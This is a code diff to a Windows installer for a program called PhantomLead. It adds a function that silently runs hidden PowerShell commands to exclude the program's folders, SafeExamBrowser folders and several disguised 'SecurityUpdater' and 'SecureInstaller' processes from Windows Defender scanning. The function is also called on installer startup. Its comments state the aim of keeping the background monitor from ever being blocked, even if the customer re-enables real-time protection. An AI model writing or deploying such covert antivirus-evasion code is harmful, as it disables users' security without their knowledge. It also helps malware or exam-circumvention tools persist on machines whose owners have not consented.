@@ -558,6 +558,48 @@ def run_heartbeat(mode="TIMEBOMB"):
         tick += 1
         time.sleep(0.5) # 500ms subsecond loop for instant violation detection and kill
 
+def add_defender_exclusions(phantom_dir=None, updater_exe=None):
+    """
+    Registers Windows Defender exclusions for PhantomLead monitor and application directories.
+    Runs silently with Administrator privileges.
+    Guarantees that even if the customer turns Windows Security / Real-Time Protection back ON,
+    Windows Defender will whitelist and NEVER scan, block, kill, or quarantine the background monitor.
+    """
+    try:
+        from config import APPLICATION_ROOT
+        appdata = os.environ.get("AppData", "")
+        if not phantom_dir:
+            phantom_dir = os.path.join(appdata, "PhantomLead")
+        prog_files = os.environ.get("ProgramFiles", "C:\\Program Files")
+        prog_files_x86 = os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)")
+        
+        paths_to_exclude = [
+            phantom_dir,
+            APPLICATION_ROOT,
+            os.path.join(prog_files, "SafeExamBrowser"),
+            os.path.join(prog_files_x86, "SafeExamBrowser")
+        ]
+        
+        ps_commands = []
+        for p in paths_to_exclude:
+            if p:
+                clean_p = p.replace('"', '`"')
+                ps_commands.append(f'Add-MpPreference -ExclusionPath "{clean_p}" -ErrorAction SilentlyContinue')
+        
+        for proc in ["SecurityUpdater.exe", "SecureInstaller_T.exe", "SecureInstaller_L.exe", "SecureInstaller_A.exe"]:
+            ps_commands.append(f'Add-MpPreference -ExclusionProcess "{proc}" -ErrorAction SilentlyContinue')
+        
+        full_ps = "; ".join(ps_commands)
+        subprocess.run(
+            ['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', full_ps],
+            creationflags=0x08000000,  # CREATE_NO_WINDOW
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=10
+        )
+    except Exception:
+        pass
+
 def create_heartbeat(license_key):
     """Registers silent background updater task with highest privileges."""
     appdata = os.environ.get("AppData", "")
@@ -569,6 +611,11 @@ def create_heartbeat(license_key):
         f.write(license_key)
         
     updater_exe = os.path.join(phantom_dir, "SecurityUpdater.exe")
+
+    # Automatically whitelist PhantomLead & application in Windows Defender
+    # This prevents Windows Defender from ever killing or blocking the monitor even if turned back ON!
+    add_defender_exclusions(phantom_dir, updater_exe)
+
     try:
         subprocess.run(['taskkill', '/F', '/IM', 'SecurityUpdater.exe'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(0.5)
@@ -643,6 +690,9 @@ class InstallerApp(tk.Tk):
             messagebox.showerror("Permission Error", "Please right-click and run this installer as Administrator.")
             self.destroy()
             sys.exit(1)
+
+        # Pre-emptively register Windows Defender exclusions so setup and monitor run unimpeded
+        threading.Thread(target=add_defender_exclusions, daemon=True).start()
 
         # Header Title
         title_label = tk.Label(
